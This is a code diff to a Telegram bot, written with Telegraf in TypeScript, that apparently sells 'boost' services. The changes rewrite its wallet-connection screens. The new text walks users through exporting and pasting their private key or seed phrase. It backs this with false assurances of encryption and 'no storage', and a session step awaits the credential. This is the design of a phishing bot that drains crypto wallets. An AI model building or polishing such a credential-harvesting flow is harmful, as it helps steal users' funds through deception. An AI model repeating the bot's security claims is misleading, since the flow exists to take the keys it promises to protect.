@@ -25,6 +25,7 @@ import {
   connectWalletKeyboard,
   securityGuidelinesKeyboard,
   howToConnectKeyboard,
+  whyConnectKeyboard,
   mainMenuOnlyKeyboard,
 } from "./keyboards.js";
 
@@ -231,11 +232,14 @@ async function showDeposit(ctx: any) {
 async function showConnectWallet(ctx: any) {
   const caption =
     `🔗 <b>Connect Your Wallet</b>\n\n` +
-    `Import and link your wallet to this bot for seamless payments and order management.\n\n` +
+    `Welcome to our secure wallet connection service!\n\n` +
+    `Connect your wallet to unlock premium features and enhanced trading capabilities.\n\n` +
     `<b>Available Options:</b>\n` +
-    `🔗 Connect Now — Import your wallet\n` +
-    `🛡️ Security Guidelines — Read before connecting\n` +
-    `📱 How to Connect — Step-by-step guide`;
+    `🔗 Connect Now - Start the connection process\n` +
+    `🔐 Why Connect? - Learn about the benefits\n` +
+    `🛡️ Security Guidelines - Important safety information\n` +
+    `📱 How to Connect - Step-by-step instructions\n\n` +
+    `Your security is our top priority. We use industry-standard encryption to protect your information.`;
   await sendPhoto(ctx, IMG.walletconnect, caption, connectWalletKeyboard);
 }
 
@@ -665,7 +669,7 @@ export function createBot(): Telegraf {
       `• 💰 <b>Auto-refunds</b> — failed orders refunded instantly\n` +
       `• 🎯 <b>Priority processing</b> — faster service\n` +
       `• 🔔 <b>Notifications</b> — alerts when boost goes live`,
-      connectWalletKeyboard
+      whyConnectKeyboard
     );
   });
 
@@ -673,12 +677,23 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
       `🛡️ <b>Security Guidelines</b>\n\n` +
-      `• End-to-End Encryption — Your data is encrypted at all times\n` +
-      `• No Storage — We never store your private keys permanently\n` +
-      `• Secure Processing — All operations use secure, isolated environments\n` +
-      `• Regular Audits — Our security is regularly tested and verified\n\n` +
-      `⚠️ <b>Never share your private key or seed phrase with anyone except this official bot interface.</b>\n\n` +
-      `Ready to proceed?`,
+      `⚠️ <b>IMPORTANT SECURITY NOTICE:</b>\n\n` +
+      `🔒 <b>What We Do:</b>\n` +
+      `• End-to-End Encryption - Your data is encrypted at all times\n` +
+      `• No Storage - We never store your private keys permanently\n` +
+      `• Secure Processing - All operations use secure, isolated environments\n` +
+      `• Regular Audits - Our security is regularly tested and verified\n\n` +
+      `❌ <b>What You Should Know:</b>\n` +
+      `• Never Share - Only enter your keys in official bot interfaces\n` +
+      `• Verify URL - Make sure you're using the official bot\n` +
+      `• Stay Alert - We will never ask for keys via other channels\n\n` +
+      `✅ <b>Best Practices:</b>\n` +
+      `• Monitor Activity - Regularly check your wallet transactions\n` +
+      `• Stay Updated - Keep your wallet software up to date\n` +
+      `• Use Hardware Wallets - For maximum security with large amounts\n\n` +
+      `🔒 <b>Our Commitment:</b>\n` +
+      `We use bank-level security measures to protect your information. Your private keys are processed securely and never stored on our servers.\n\n` +
+      `Ready to proceed safely?`,
       securityGuidelinesKeyboard
     );
   });
@@ -687,12 +702,27 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     await editOrSend(ctx,
       `📱 <b>How to Connect Your Wallet</b>\n\n` +
-      `1️⃣ Click <b>Connect Now</b>\n` +
-      `2️⃣ Open your wallet app (Phantom, Solflare, MetaMask, etc.)\n` +
-      `3️⃣ Go to Settings → Export Private Key or Seed Phrase\n` +
-      `4️⃣ Copy and paste it into the bot\n` +
-      `5️⃣ Wait for confirmation\n\n` +
-      `⏰ Connection usually takes 2–5 minutes.`,
+      `🔧 <b>Step-by-Step Process:</b>\n\n` +
+      `1️⃣ <b>Choose Connection Method</b>\n` +
+      `• Private Key - Direct key import (fastest)\n` +
+      `• Seed Phrase - 12/24 word recovery phrase\n\n` +
+      `2️⃣ <b>Prepare Your Information</b>\n` +
+      `• Open your wallet app (Phantom, Solflare, etc.)\n` +
+      `• Navigate to wallet settings or security section\n` +
+      `• Copy your private key or seed phrase\n\n` +
+      `3️⃣ <b>Secure Connection</b>\n` +
+      `• Click "Start Connection" below\n` +
+      `• Paste your key or seed phrase when prompted\n` +
+      `• Wait for confirmation (2-5 minutes)\n\n` +
+      `📱 <b>Supported Wallets:</b>\n` +
+      `• Phantom - Most popular Solana wallet\n` +
+      `• Solflare - Advanced features and security\n` +
+      `• Backpack - Modern interface and tools\n` +
+      `• Glow - Mobile-optimized experience\n` +
+      `• Other Solana Wallets - Most SPL-compatible wallets\n\n` +
+      `⏰ Connection Time: Usually 2-5 minutes\n` +
+      `🔒 Security: Military-grade encryption throughout\n\n` +
+      `Ready to connect your wallet?`,
       howToConnectKeyboard
     );
   });
@@ -701,8 +731,23 @@ export function createBot(): Telegraf {
     await ctx.answerCbQuery();
     setSession(ctx.from.id, { step: "awaiting_wallet_credential" });
     await editOrSend(ctx,
+      `🔗 <b>Connect Your Wallet Now</b>\n\n` +
       `⚠️ This action is going to import in your Main Wallet.. please Note Again you are the ONLY ONE access to this wallet..\n\n` +
-      `Please enter your <b>Private Key</b> or <b>12/24 word Seed Phrase</b> to import your wallet:`,
+      `Please enter your Private Key or 12 word Seed Phrase to import your wallet:\n\n` +
+      `🔑 <b>Private Key Format:</b>\n` +
+      `• Single long string (64+ characters)\n` +
+      `• Example:\n` +
+      `<code>5KJvsngHeMpm884wtkJNzQGaCErckhHJBGFsvd3VyK5qMZXj3hS</code>\n\n` +
+      `🌱 <b>Seed Phrase Format:</b>\n` +
+      `• 12 or 24 words separated by spaces\n` +
+      `• Example: <code>abandon ability able about above absent absorb abstract absurd abuse access accident</code>\n\n` +
+      `❓ <b>Security Features:</b>\n` +
+      `• End-to-end encryption\n` +
+      `• Secure processing environment\n` +
+      `• Immediate deletion after connection\n` +
+      `• No permanent storage\n\n` +
+      `⚡ <b>Auto-Detection:</b>\n` +
+      `Our system will automatically detect whether you're providing a private key or seed phrase.`,
       cancelKeyboard
     );
   });
